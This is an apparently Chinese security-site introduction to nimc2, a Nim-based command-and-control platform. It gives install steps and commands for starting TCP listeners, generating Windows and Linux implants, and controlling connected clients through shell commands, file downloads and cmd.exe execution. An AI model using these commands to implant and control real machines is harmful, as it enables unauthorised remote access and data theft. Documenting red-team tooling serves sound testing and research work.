![](https://image.3001.net/images/20220705/1657021655_62c424d796e6f8c2ad421.jpeg!small)

## 关于nimc2

nimc2是一款功能强大的轻量级C2平台，该工具基于纯Nim语言开发，可以帮助广大研究人员或网络管理员实现各种C2功能。

## 功能介绍

    
    
    支持Windows和Linux操作系统
    
    支持TCP套接字通信
    
    能够创建任意多个监听器
    
    包含功能强大的任务系统
    
    提供了用于存储截图和下载文件的loot系统
    
    功能模块支持自定义开发，可以自由扩展功能
    
    易于使用的命令行终端接口
    
    ......

## 工具安装

首先，我们需要安装git、nim和mingw工具链：

    
    
    apt install git nim mingw-w64

接下来，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/d4rckh/nimc2

然后切换到项目根目录，并运行下列命令安装该工具所需的其他依赖组件包：

    
    
    cd nimc2
    
    nimble install

安装完成之后，给server.sh文件提供可执行权限：

    
    
    chmod +x ./server.sh

最后，运行下列命令即可执行nimc2服务器：

    
    
    ./server.sh

## 工具使用

nimc2服务器端基于命令行接口实现其功能，我们可以在查看到“(main) nimc2 >”提示后输入想要执行的命令即可。

### 监听器创建

我们可以使用“startlistener”命令来创建一个TCP监听器：

    
    
    startlistener tcp --ip:(ip) --port:(port)

 **演示样例** ：

    
    
    startlistener tcp --ip:127.0.0.1 --port:1337
    
    startlistener tcp -i:0.0.0.0 -p:1337
    
    startlistener tcp -i:192.168.0.19 -p:1337

创建完成后，可以使用“listeners”命令来查看出监听器。

### 生成植入程序

下列命令可以生成一个植入程序：

    
    
    generateimplant (listener type) (ip) (port) (platform)
    
    或
    
    generateimplant (listener type) (platform)

其中，监听器识别组件由两部分组成：监听器类型和监听器id，比如说tcp:0或tcp:1。

 **演示样例** ：

    
    
    generateimplant -l:tcp -i:127.0.0.1 -p:1337 -P:windows
    
    generateimplant -l:tcp -i:127.0.0.1 -p:1337 -P:linux
    
    generateimplant -l:tcp:0 -P:linux
    
    generateimplant -l:tcp:0 -P:windows

客户端每隔5000毫秒就会自动尝试与服务器进行连接，可以使用“-t”参数来设置这个时间间隔。

### 与客户端交互

当客户端与你的服务器连接之后，我们可以通过下列两个命令查看到日志信息：

    
    
    clients：显示所有的客户端；
    
    listeners --clients：显示所有的监听器以及对应的客户端；

接下来，我们就可以使用“interact”命令来与客户端交互了。比如说，下列命令可以与ID为0的客户端进行交互：

    
    
    interact 0

下面给出的是可以执行的客户端操作命令：

    
    
    shell：进入shell模式；
    
    shell "whoami"：在客户端执行whoami；
    
    download "c:\users\andrei\desktop\flag"：下载“c:\users\andrei\desktop\flag”文件；
    
    msgbox "[title]" "[caption]"：发送消息（仅Windows支持）；
    
    cmd "[command]"：通过cmd.exe运行命令（仅Windows支持）；

## 工具运行截图

![](https://image.3001.net/images/20220705/1657021747_62c42533beb743f6cf039.png!small)

![](https://image.3001.net/images/20220705/1657021755_62c4253b797636bd6eda6.png!small)

![](https://image.3001.net/images/20220705/1657021763_62c425434d13c0ea0524d.png!small)

![](https://image.3001.net/images/20220705/1657021770_62c4254a08150d4db88d6.png!small)![](https://image.3001.net/images/20220705/1657021783_62c425576aff2776105a4.png!small)

  

## 许可证协议

本项目的开发与发布遵循[ _GPL_
_-3.0_](https://github.com/d4rckh/nimc2/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **nimc2** ：【[ _GitHub传送门_](https://github.com/d4rckh/nimc2)】

